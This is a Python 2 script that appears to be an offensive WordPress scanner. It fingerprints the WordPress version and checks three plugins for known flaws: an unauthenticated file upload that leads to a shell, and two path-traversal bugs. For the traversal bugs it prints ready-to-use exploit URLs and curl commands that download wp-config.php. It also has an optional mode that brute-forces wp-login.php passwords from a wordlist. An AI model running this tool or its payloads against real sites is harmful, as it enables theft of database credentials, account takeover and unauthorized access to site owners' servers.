
import requests
import argparse
import re



class WordPress_Scan():
	def __init__(self,dict):
		self.url = dict['url']
		self.brute = dict['brute']
		self.username = dict['uname']
		self.pwdfile = dict['pwd']

	def Brute_Force(self):
		print "start Brute_Force......"
 		self.path4 = "http://{0}".format(self.url)+'/wp-login.php'
 		for self.temp in open(self.pwdfile):
			self.passwd = self.temp.strip()
			self.payload = {'log':self.username,'pwd':self.passwd,'redirect_to':''}
			self.bre_re = requests.post(self.path4, data = self.payload)
			if (self.bre_re.text == ''):
				print "\33[32m[+] test password %s : success !\33[0m" %self.passwd
				break
			else:
				print "[-] test password %s : fail" %self.passwd

	def VersionScan(self):
		self.Version_Path =  "http://{0}".format(self.url)+'/readme.html'
		self.Version_Page = requests.get(self.Version_Path)
		self.Version_Page.encoding='utf-8'
		if(self.Version_Page.status_code == 200):
			self.Version_text = self.Version_Page.text
			#print self.Version_text
			self.reg = r'<br />(.+?)</h1>'
			self.RegEx = re.compile(self.reg,re.S)
			self.Version = re.findall(self.RegEx,self.Version_text)
			for line in self.Version:
				print "Wordpress Version:%s" %line.encode("utf-8")

	def scan(self):
		self.VersionScan()
		#Wordpress Plugins jQuery Html5 File Upload
		self.path1 =   "http://{0}".format(self.url)+'/wp-admin/admin-ajax.php?action=load_ajax_function'
		self.path2 =  "http://{0}".format(self.url)+'/wp-content/plugins/jquery-html5-file-upload/'
		self.re1= requests.get(self.path2)
		if(self.re1.status_code == 403 or self.re1.status_code == 200):
			self.re2 = requests.get(self.path1)
			if(self.re2.text.find('{"files":[]}') != -1):
				print "\33[31m"'[+]  Wordpress Plugins jQuery Html5 File Upload'"\033[0m"
 				print "Exploit: \n\t""\33[32m"'<form method="POST" action="test.com/ enctype="multipart/form-data"> <input type="file" name="files[]" /><button>Upload</button>'"\033[0m"
 				print "Shell Access :\n\t\33[32m http://www.test.com/wp-content/uploads/files/guest/shell.php \033[0m"
 		#Wordpress Plugin HB Audio Gallery Lite - Arbitrary File Download
 		self.path3 = "http://{0}".format(self.url)+'/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php'
 		self.re3 = requests.get(self.path3)
 		if(self.re3.status_code ==  200):
 			print "\33[31m"'[+]  Wordpress Plugin HB Audio Gallery Lite - Arbitrary File Download'"\033[0m"
 			print "Exploit: \n\t""\33[32m"'http://www.test.com/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10'"\033[0m"

 		#WordPress Memphis Document Library Plugin 3.1.5 Path Disclosure
 		self.path5 = "http://{0}".format(self.url)+'/wp-content/plugins/memphis-documents-library/mdocs-downloads.php'
 		self.path6 = "http://{0}".format(self.url)+'?mdocs-img-preview=../../../wp-config.php -o example-wp-config.php'
 		self.re4 = requests.get(self.path5)
 		if(self.re4.status_code == 200):
 			self.re5 = requests.get(self.path6)
 			if(self.re5.status_code==200):
 				print  "\33[31m"'[+]  WordPress Memphis Document Library Plugin 3.1.5 Path Disclosure'"\033[0m"
 				print "Exploit: \n\t""\33[32m"'curl http://example.site.com/?mdocs-img-preview=../../../wp-config.php -o example-wp-config.php'"\033[0m"
 				print " \t""\33[32m"'curl http://example.site.com/mdocs-posts/?mdocs-img-preview=../../../wp-config.php -o example-wp-config.php'"\033[0m"


 		if(self.brute == True):
 			self.Brute_Force()

 	


if __name__  == '__main__':
	parser = argparse.ArgumentParser(prog = 'Wordpress scan',usage = 'scan.py [options]',add_help = False)
	parser.add_argument('-u',dest = 'url',help = 'input url')
	parser.add_argument('-h',action = 'help',help = 'output help')
	parser.add_argument('-b',dest = 'brute',action = 'store_true',default = False,help = 'brute force')
	parser.add_argument('-n',dest = 'uname',help = 'username')
	parser.add_argument('-p',dest =  'pwd',help  = 'password.txt')
	args = parser.parse_args()
	dict = args.__dict__
	wpscan = WordPress_Scan(dict)
	wpscan.scan()